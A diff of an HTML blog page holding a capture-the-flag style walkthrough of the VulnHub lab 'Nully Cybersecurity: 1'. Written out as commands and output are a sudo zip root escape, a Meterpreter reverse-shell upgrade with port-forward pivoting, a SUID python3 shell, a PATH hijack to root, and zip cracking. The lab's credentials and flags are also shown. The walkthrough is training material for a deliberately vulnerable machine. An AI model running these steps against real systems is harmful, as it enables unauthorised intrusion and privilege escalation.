@@ -20,7 +20,7 @@
   
   
   
-  <link rel="canonical" href="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/" />
+  <link rel="canonical" href="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/" />
   
   
   
@@ -68,18 +68,18 @@
   
   
   <meta property="og:title" content="NULLY CYBERSECURITY:1(Vulnuhb)" />
-<meta property="og:description" content="Nully Cybersecurity: 1" />
+<meta property="og:description" content="Description # Nully Cybersecurity: 1" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/1.png" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/2.png" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/3.png" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/4.png" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/5.png" /><meta property="og:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/6.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/1.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/2.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/3.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/4.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/5.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/6.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-09-26T21:59:31+00:00" />
 <meta property="article:modified_time" content="2022-05-24T14:30:15+03:00" /><meta property="og:site_name" content="Trevor Saudi" />
 
 
   <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://trevorsaudi.github.io/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/1.png"/>
+<meta name="twitter:image" content="https://trevorsaudi.com/posts/2020-09-26_nully-cybersecurity1vulnuhb/images/1.png"/>
 
 <meta name="twitter:title" content="NULLY CYBERSECURITY:1(Vulnuhb)"/>
-<meta name="twitter:description" content="Nully Cybersecurity: 1"/>
+<meta name="twitter:description" content="Description # Nully Cybersecurity: 1"/>
 
   
   <script type="application/ld+json">
@@ -90,9 +90,9 @@
     "name": "NULLY CYBERSECURITY:1(Vulnuhb)",
     "headline": "NULLY CYBERSECURITY:1(Vulnuhb)",
     
-    "abstract": "Nully Cybersecurity: 1",
+    "abstract": "Description # Nully Cybersecurity: 1",
     "inLanguage": "en",
-    "url" : "https:\/\/trevorsaudi.github.io\/posts\/2020-09-26_nully-cybersecurity1vulnuhb\/",
+    "url" : "https:\/\/trevorsaudi.com\/posts\/2020-09-26_nully-cybersecurity1vulnuhb\/",
     "author" : {
       "@type": "Person",
       "name": "Trevor Saudi"
@@ -103,10 +103,10 @@
     
     "dateModified": "2022-05-24T14:30:15\u002b03:00",
     
-    
+    "keywords": ["Pivoting","Machine"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "2396"
+    "wordCount": "2436"
   }]
   </script>
 
@@ -189,7 +189,7 @@
           >
             <a
               class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
-              href=""
+              href="/about/"
               title=""
               >About</a
             >
@@ -336,9 +336,20 @@
   >
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
       <ul>
-        <li><a href="#description">Description</a></li>
+        <li><a href="#bruteforcing-and-exploitation">Bruteforcing and exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#rooting-the-mail-server">Rooting the mail server</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+    <li><a href="#2nd-flag">2nd Flag</a>
+      <ul>
+        <li><a href="#pivoting">Pivoting</a></li>
+        <li><a href="#path-variable-manipulation">Path variable manipulation</a></li>
+        <li><a href="#flag-3">Flag 3</a></li>
+        <li><a href="#privilege-escalation-1">Privilege escalation</a></li>
       </ul>
     </li>
   </ul>
@@ -350,14 +361,14 @@
         </div>
       
       <div class="min-w-0 min-h-0 max-w-prose">
-        <p><a href="https://www.vulnhub.com/entry/nully-cybersecurity-1,549/">Nully Cybersecurity: 1</a></p>
-<h3 id="description" class="relative group">Description <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#description" aria-label="Anchor">#</a></span></h3>
-<p>Nully Cybersecurity — this is an easy-intermediate realistic machine.</p>
+        <h2 id="description" class="relative group">Description <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#description" aria-label="Anchor">#</a></span></h2>
+<p><a href="https://www.vulnhub.com/entry/nully-cybersecurity-1,549/">Nully Cybersecurity: 1</a></p>
+<p> — this is an easy-intermediate realistic machine.</p>
 <p>While working with the machine, you will need to brute force, pivoting (using metasploit, via portfwd), exploitation web app, and using searchsploit.</p>
 <p>About: Wait 5–8 minutes before starting for the machine to start its services. Also, check the welcome page on port 80.</p>
-<p>Hints: ‘cat rockyou.txt | grep bobby > wordlist’ for generating wordlist.</p>
+<p>Hints: ‘cat rockyou.txt | grep bobby &gt; wordlist’ for generating wordlist.</p>
 <p>Story: You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.</p>
-<p><strong>Reconnaissance</strong></p>
+<h2 id="reconnaissance" class="relative group">Reconnaissance <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a></span></h2>
 <p>Making sure you can ping the VM we are attacking from your network -I usually my VMs in Bridged Adapter mode. Proceed to scan the network to determine open ports and services running</p>
 <p>
 
@@ -389,8 +400,8 @@
 
 </p>
 <p>At the bottom of the webpage, we get some information
-<code>Nully Security Company has 3 servers and your goal is to get root access on each of them   To start, check your email on port 110 with authorization data &amp;lt;code&amp;gt;pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO</code></p>
-<p><strong>Bruteforcing and exploitation</strong></p>
+<code>Nully Security Company has 3 servers and your goal is to get root access on each of them   To start, check your email on port 110 with authorization data &lt;code&gt;pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO</code></p>
+<h3 id="bruteforcing-and-exploitation" class="relative group">Bruteforcing and exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bruteforcing-and-exploitation" aria-label="Anchor">#</a></span></h3>
 <p>From the above information and the challenge description we can tell that once we get root access on the first server, you will be required to pivot to the rest of the servers and get root access in each. So let’s get hacking :)</p>
 <p>
 
@@ -438,11 +449,11 @@
 
 </p>
 <p>We get credentials to the mail server !</p>
-<p><strong>Rooting the mail server</strong></p>
+<h2 id="rooting-the-mail-server" class="relative group">Rooting the mail server <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#rooting-the-mail-server" aria-label="Anchor">#</a></span></h2>
 <p>Once we log in through ssh, taking a look around there’s a file named todo with the following info
 <code>1. Install postfix and dovecot   2. Write a letter to the penetration tester about the server.   3. Write a script to check the server.   4. Create my2user to backup important data.(I think for security reasons I will back up important data with the help of another user)</code></p>
 <p>hmm, let’s see what sudo commands bob can run on this server</p>
-<p><strong>Privilege escaltion</strong></p>
+<h2 id="privilege-escalation" class="relative group">Privilege escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation" aria-label="Anchor">#</a></span></h2>
 <p>
 
 
@@ -488,9 +499,11 @@
   
 
 </p>
-<p>We can exploit that to drop into a shell as root! [GTFobins] (<a href="https://gtfobins.github.io/)is">https://gtfobins.github.io/)is</a> a good online resource for binaries that can be exploited or this purposes, checking for zip :
-<code>TF=$(mktemp -u)   sudo zip $TF /etc/hosts -T -TT &amp;#39;sh #&amp;#39;   sudo rm $TF</code>
-
+<p>We can exploit that to drop into a shell as root! [GTFobins] (<a href="https://gtfobins.github.io/)is">https://gtfobins.github.io/)is</a> a good online resource for binaries that can be exploited or this purposes, checking for zip :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -u<span class="k">)</span>  
+sudo zip <span class="nv">$TF</span> /etc/hosts -T -TT <span class="p">&amp;</span><span class="c1">#39;sh #&amp;#39;  </span>
+sudo rm <span class="nv">$TF</span>
+</code></pre></div><p>
 
 
 
@@ -510,8 +523,8 @@ Mail server is rooted.<br>
 You got the first flag: 2c393307906f29ee7fb69e2ce59b4c8a<br>
 Now go to the web server and root it.</p>
 <p>`</p>
-<p><strong>2nd Flag</strong></p>
-<p><strong>Pivoting</strong></p>
+<h2 id="2nd-flag" class="relative group">2nd Flag <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2nd-flag" aria-label="Anchor">#</a></span></h2>
+<h3 id="pivoting" class="relative group">Pivoting <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pivoting" aria-label="Anchor">#</a></span></h3>
 <p><strong>Pivoting</strong> is the technique of using an instance to be able to move around inside a network. We first begin by identifying all the IPs connected in the network. This way, we can pin point the web server and the database server.</p>
 <p>
 
@@ -543,28 +556,39 @@ Now go to the web server and root it.</p>
   
 
 </p>
-<p>Next, background the shell and upgrade it to a meterpreter shell
-`msf5 post(multi/manage/shell_to_meterpreter) > options<code>Module options (post/multi/manage/shell_to_meterpreter):</code>Name     Current Setting  Required  Description</p>
-<hr>
-<p>HANDLER  true             yes       Start an exploit/multi/handler to receive the connection<br>
-LHOST    192.168.1.10     no        IP of host that will receive the connection from the payload (Will try to auto detect).<br>
-LPORT    4433             yes       Port for payload to connect to.<br>
-SESSION  1                yes       The session to run this module on.<code>msf5 post(multi/manage/shell_to_meterpreter) &amp;gt; run</code>[<em>] Upgrading session ID: 1<br>
-[</em>] Starting exploit/multi/handler<br>
-[<em>] Started reverse TCP handler on 192.168.1.10:4433<br>
-[</em>] Sending stage (980808 bytes) to 192.168.1.12<br>
-[<em>] Meterpreter session 2 opened (192.168.1.10:4433 -> 192.168.1.12:35888) at 2020-09-26 11:33:25 +0100<br>
-[</em>] Command stager progress: 100.00% (773/773 bytes)<br>
-[*] Post module execution completed<br>
-msf5 post(multi/manage/shell_to_meterpreter) > sessions -i<code>Active sessions   ===============</code>Id  Name  Type                   Information                                                       Connection</p>
-<hr>
-<p>1         shell sparc/bsd        #                                                                 192.168.1.10:5555 -> 192.168.1.12:32832 (192.168.1.12)<br>
-2         meterpreter x86/linux  no-user @ MailServer (uid=0, gid=0, euid=0, egid=0) @ 172.17.0.5  192.168.1.10:4433 -> 192.168.1.12:35888 (172.17.0.5)<code>msf5 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions -i 2   [*] Starting interaction with 2...</code>meterpreter >`</p>
-<p>Set up autoroute and port forwarding .
-<code>run autoroute -s 172.17.0.1/16   portfwd add -l 8888 -p 80 -r 172.17.0.2</code></p>
-<p>run autoroute -s <target IP /netmask></p>
-<p>portfwd add -l <port to listen to on local machine> -p <remote port to connect to> -r <target IP></p>
-<p>Access the webserver on remote machine</p>
+<p>Next, background the shell and upgrade it to a meterpreter shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; options
+Module options <span class="o">(</span>post/multi/manage/shell_to_meterpreter<span class="o">)</span>:
+Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  <span class="nb">true</span>             yes       Start an exploit/multi/handler to receive the connection
+   LHOST    192.168.1.10     no        IP of host that will receive the connection from the payload <span class="o">(</span>Will try to auto detect<span class="o">)</span>.
+   LPORT    <span class="m">4433</span>             yes       Port <span class="k">for</span> payload to connect to.
+   SESSION  <span class="m">1</span>                yes       The session to run this module on.
+msf5 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; run
+<span class="o">[</span>*<span class="o">]</span> Upgrading session ID: <span class="m">1</span>
+<span class="o">[</span>*<span class="o">]</span> Starting exploit/multi/handler
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.1.10:4433 
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">980808</span> bytes<span class="o">)</span> to 192.168.1.12
+<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">2</span> opened <span class="o">(</span>192.168.1.10:4433 -&gt; 192.168.1.12:35888<span class="o">)</span> at 2020-09-26 11:33:25 +0100
+<span class="o">[</span>*<span class="o">]</span> Command stager progress: 100.00% <span class="o">(</span>773/773 bytes<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> Post module execution completed
+msf5 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; sessions -i
+Active <span class="nv">sessions</span>
+<span class="o">===============</span>
+Id  Name  Type                   Information                                                       Connection
+  --  ----  ----                   -----------                                                       ----------
+  <span class="m">1</span>         shell sparc/bsd        <span class="c1">#                                                                 192.168.1.10:5555 -&gt; 192.168.1.12:32832 (192.168.1.12)</span>
+  <span class="m">2</span>         meterpreter x86/linux  no-user @ MailServer <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0, <span class="nv">gid</span><span class="o">=</span>0, <span class="nv">euid</span><span class="o">=</span>0, <span class="nv">egid</span><span class="o">=</span>0<span class="o">)</span> @ 172.17.0.5  192.168.1.10:4433 -&gt; 192.168.1.12:35888 <span class="o">(</span>172.17.0.5<span class="o">)</span>
+msf5 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; sessions -i <span class="m">2</span>
+<span class="o">[</span>*<span class="o">]</span> Starting interaction with 2...
+meterpreter &gt;
+</code></pre></div><p>Set up autoroute and port forwarding .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">run autoroute -s 172.17.0.1/16  
+portfwd add -l <span class="m">8888</span> -p <span class="m">80</span> -r 172.17.0.2
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">run autoroute -s &lt;target IP /netmask&gt;
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">portfwd add -l &lt;port to listen to on <span class="nb">local</span> machine&gt; -p &lt;remote port to connect to&gt; -r &lt;target IP&gt;
+</code></pre></div><p>Access the webserver on remote machine</p>
 <p>
 
 
@@ -639,48 +663,176 @@ msf5 post(multi/manage/shell_to_meterpreter) > sessions -i<code>Active sessions 
 
 </p>
 <p>We get a reverse shell to the web server</p>
-<p>Digging around, we get a lot of permission denied errors when accessing Oscar’s files . Let’s try some privilege escalation
-<code>$ find / -perm -4000 -exec ls -l {} \; 2&amp;gt;/dev/null   -rwsr-xr-x 1 root root 44784 May 28 08:37 /usr/bin/newgrp   -rwsr-xr-x 1 root root 68208 May 28 08:37 /usr/bin/passwd   -rwsr-xr-x 1 root root 67816 Apr  2 17:29 /usr/bin/su   -rwsr-xr-x 1 root root 55528 Apr  2 17:29 /usr/bin/mount   -rwsr-xr-x 1 root root 85064 May 28 08:37 /usr/bin/chfn   -rwsr-xr-x 1 root root 39144 Apr  2 17:29 /usr/bin/umount   -rwsr-xr-x 1 root root 53040 May 28 08:37 /usr/bin/chsh   -rwsr-xr-x 1 root root 88464 May 28 08:37 /usr/bin/gpasswd   -rwsr-xr-x 1 root root 166056 Feb  3  2020 /usr/bin/sudo   -rwsr-xr-x 1 oscar oscar 5457568 Aug 26 14:19 /usr/bin/python3   -rwsr-xr-- 1 root messagebus 51344 Dec  7  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper   -rwsr-xr-x 1 root root 473576 Feb 26  2020 /usr/lib/openssh/ssh-keysign</code></p>
-<p>/usr/bin/python3 has some opportunity for horizontal privilege escalation. GTFobins comes in handy.
-<code>$ python3 -c &amp;#39;import os; os.execl(&amp;#34;/bin/sh&amp;#34;, &amp;#34;sh&amp;#34;, &amp;#34;-p&amp;#34;)&amp;#39;``id   uid=33(www-data) gid=33(www-data) euid=1000(oscar) groups=33(www-data)</code></p>
-<p>We can now access files whose permissions are set to Oscar only.
-<code>cd oscar   ls   my_password   scripts   cat my_password   H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o</code></p>
-<p><strong>Path variable manipulation</strong></p>
-<p>A script called current-date displays the current date. Since in linux, date command is used to do that, I figured the script calls the date command and probably does this using its full path. We can edit our own date variable and pass in /bin/bash so it gets executed when we call the current-date script and drop into a root shell
-`cd /tmp<br>
-ls<br>
-echo &quot;/bin/bash&quot; > date<br>
-chmod 777 date<br>
-export PATH=/tmp:$PATH<br>
-cd /home/oscar<br>
-ls -al<br>
-cd scripts<br>
-ls<br>
-current-date<br>
-./current-date<br>
-id<br>
-uid=0(root) gid=0(root) groups=0(root),33(www-data)<br>
-cat 2_flag.txt</p>
-<hr>
-<p>\ \        / / | | |     | |                <br>
-\ \  /\  / /__| | |   <strong>| | ___  _ __   ___<br>
-\ /  / / _ \ | |  / <em>` |/ _ | '</em> \ / _ \<br>
-\  /\  /  <strong>/ | | | (<em>| | (</em>) | | | |  <strong>/<br>
-/  / _</strong>|<em>|</em>|  _<em>,</em>|_</strong>/|<em>| |</em>|_</strong>|</p>
-<p>Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da<br>
-Now go to the Database server.`</p>
-<p>We get the 2nd flag!</p>
-<p><strong>Flag 3</strong></p>
-<p>Inside the web server, we ftp to the database server and do some digging.
-<code>root@WebServer:/root# ftp 172.17.0.5   ftp 172.17.0.5   Connected to 172.17.0.5.   220 (vsFTPd 3.0.3)   Name (172.17.0.5:root): anonymous   anonymous   230 Login successful.   Remote system type is UNIX.   Using binary mode to transfer files.   ftp&amp;gt; ls   ls   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 pub   226 Directory send OK.   ftp&amp;gt; cd pub   cd pub   250 Directory successfully changed.   ftp&amp;gt; ls   ls   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   -rw-r--r--    1 ftp      ftp             0 Aug 27 09:35 test   226 Directory send OK.   ftp&amp;gt; ls -al   ls -al   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 .   drwxr-xr-x    3 ftp      ftp          4096 Aug 27 08:34 ..   drwxr-xr-x    2 ftp      ftp          4096 Aug 27 14:44 .folder   -rw-r--r--    1 ftp      ftp             0 Aug 27 09:35 test   226 Directory send OK.   ftp&amp;gt; mv .folder folder   mv .folder folder   ?Invalid command   ftp&amp;gt; cd .folder   cd .folder   250 Directory successfully changed.   ftp&amp;gt; ls   ls   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   -rw-r--r--    1 ftp      ftp            15 Aug 27 09:07 file.txt   226 Directory send OK.   ftp&amp;gt; cat file.txt   ftp&amp;gt; ls -al   ls -al   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   drwxr-xr-x    2 ftp      ftp          4096 Aug 27 14:44 .   drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 ..   -rw-r--r--    1 ftp      ftp           224 Aug 27 09:37 .backup.zip   -rw-r--r--    1 ftp      ftp            15 Aug 27 09:07 file.txt   226 Directory send OK.   ftp&amp;gt; get file.txt   get file.txt   local: file.txt remote: file.txt   200 PORT command successful. Consider using PASV.   150 Opening BINARY mode data connection for file.txt (15 bytes).   226 Transfer complete.   15 bytes received in 0.00 secs (92.1285 kB/s)   ftp&amp;gt; get .backup.zip   get .backup.zip   local: .backup.zip remote: .backup.zip   200 PORT command successful. Consider using PASV.   150 Opening BINARY mode data connection for .backup.zip (224 bytes).   226 Transfer complete.   224 bytes received in 0.00 secs (268.7346 kB/s)   ftp&amp;gt; exit   exit   221 Goodbye.   root@WebServer:/root# ls   ls   2_flag.txt  file.txt  typescript   root@WebServer:/root# ls -al   ls -al   total 60   drwx------ 1 root root  4096 Sep 26 23:01 .   drwxr-xr-x 1 root root  4096 Aug 25 16:08 ..   -rw-r--r-- 1 root root   224 Sep 26 23:01 .backup.zip   -rw------- 1 root root     0 Sep 26 22:02 .bash_history   -rw-r--r-- 1 root root  3106 Dec  5  2019 .bashrc   -rw-r--r-- 1 root root   161 Dec  5  2019 .profile   -rw-r--r-- 1 root root     0 Aug 26 14:20 .selected_editor   -rwxr-xr-x 1 root root   215 Aug 27 14:43 .services   drwx------ 2 root root  4096 Aug 27 09:59 .ssh   -rw------- 1 root root 10606 Aug 27 15:05 .viminfo   -rw-r--r-- 1 root root   467 Aug 26 14:03 2_flag.txt   -rw-r--r-- 1 root root    15 Sep 26 23:00 file.txt   -rw-r--r-- 1 root root 10157 Sep 26 13:58 typescript   root@WebServer:/root# cat file.txt</code></p>
-<p>We retrieve 2 files, file.txt and .backup.zip. file.txt is a dead end so we look into backup.txt.</p>
-<p>I transferred the backup.zip file to oscar’s directory and used chown to give him permissions to access the file. Then pivoted the traffic on port 22 to our localhost so we can access the ssh server as oscar using his credentials(that we found earlier).
-<code>meterpreter &amp;gt; portfwd add -l 2022 -p 22 -r 172.17.0.4``ssh oscar@localhost -p 2022``oscar@WebServer:~$ ls -al   total 40   drwx------ 4 oscar oscar 4096 Sep 26 23:05 .   drwxr-xr-x 1 root  root  4096 Aug 26 13:38 ..   -rw------- 1 oscar oscar    0 Sep 26 22:02 .bash_history   -rw-r--r-- 1 oscar oscar  220 Aug 25 16:11 .bash_logout   -rw-r--r-- 1 oscar oscar 3771 Aug 25 16:11 .bashrc   drwx------ 2 oscar oscar 4096 Aug 25 20:09 .cache   -rw-r--r-- 1 oscar oscar  807 Aug 25 16:11 .profile   -rw------- 1 oscar oscar 2183 Aug 26 14:25 .viminfo   -rw-r--r-- 1 oscar oscar  224 Sep 26 23:01 backup.zip   -r-------- 1 oscar oscar   37 Aug 26 14:25 my_password   drwx------ 2 oscar oscar 4096 Sep 26 22:57 scripts   oscar@WebServer:~$</code></p>
-<p>Now that we can access oscar’s account on our local machine, we can use scp to download the zip file and analyse it incase it requires cracking.
-<code>scp -P 2022 oscar@localhost:/home/oscar/backup.zip </code></p>
-<p>Crack the zip file using zip2john and john
-<code>zip2john backup.zip &amp;gt; hash.txt   john hash.txt</code>
-
+<p>Digging around, we get a lot of permission denied errors when accessing Oscar’s files . Let’s try some privilege escalation</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -4000 -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">44784</span> May <span class="m">28</span> 08:37 /usr/bin/newgrp
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">68208</span> May <span class="m">28</span> 08:37 /usr/bin/passwd
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">67816</span> Apr  <span class="m">2</span> 17:29 /usr/bin/su
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">55528</span> Apr  <span class="m">2</span> 17:29 /usr/bin/mount
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">85064</span> May <span class="m">28</span> 08:37 /usr/bin/chfn
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">39144</span> Apr  <span class="m">2</span> 17:29 /usr/bin/umount
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">53040</span> May <span class="m">28</span> 08:37 /usr/bin/chsh
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">88464</span> May <span class="m">28</span> 08:37 /usr/bin/gpasswd
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">166056</span> Feb  <span class="m">3</span>  <span class="m">2020</span> /usr/bin/sudo
+-rwsr-xr-x <span class="m">1</span> oscar oscar <span class="m">5457568</span> Aug <span class="m">26</span> 14:19 /usr/bin/python3
+-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">51344</span> Dec  <span class="m">7</span>  <span class="m">2019</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">473576</span> Feb <span class="m">26</span>  <span class="m">2020</span> /usr/lib/openssh/ssh-keysign
+</code></pre></div><p>/usr/bin/python3 has some opportunity for horizontal privilege escalation. GTFobins comes in handy.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+<span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">oscar</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div><p>We can now access files whose permissions are set to Oscar only.</p>
+<pre tabindex="0"><code>cd oscar  
+ls  
+my_password  
+scripts  
+cat my_password  
+H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`
+</code></pre><h3 id="path-variable-manipulation" class="relative group">Path variable manipulation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#path-variable-manipulation" aria-label="Anchor">#</a></span></h3>
+<p>A script called current-date displays the current date. Since in linux, date command is used to do that, I figured the script calls the date command and probably does this using its full path. We can edit our own date variable and pass in /bin/bash so it gets executed when we call the current-date script and drop into a root shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
+ls
+<span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; date
+chmod <span class="m">777</span> date
+<span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="nb">cd</span> /home/oscar
+ls -al
+<span class="nb">cd</span> scripts
+ls
+current-date
+./current-date
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+cat 2_flag.txt
+ __          __  _ _       _                  
+ <span class="se">\ \ </span>       / / <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span>                 
+  <span class="se">\ \ </span> /<span class="se">\ </span> / /__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>   __<span class="p">|</span> <span class="p">|</span> ___  _ __   ___ 
+   <span class="se">\ \/</span>  <span class="se">\/</span> / _ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>  / _<span class="sb">`</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\
+</span><span class="se"></span>    <span class="se">\ </span> /<span class="se">\ </span> /  __/ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/
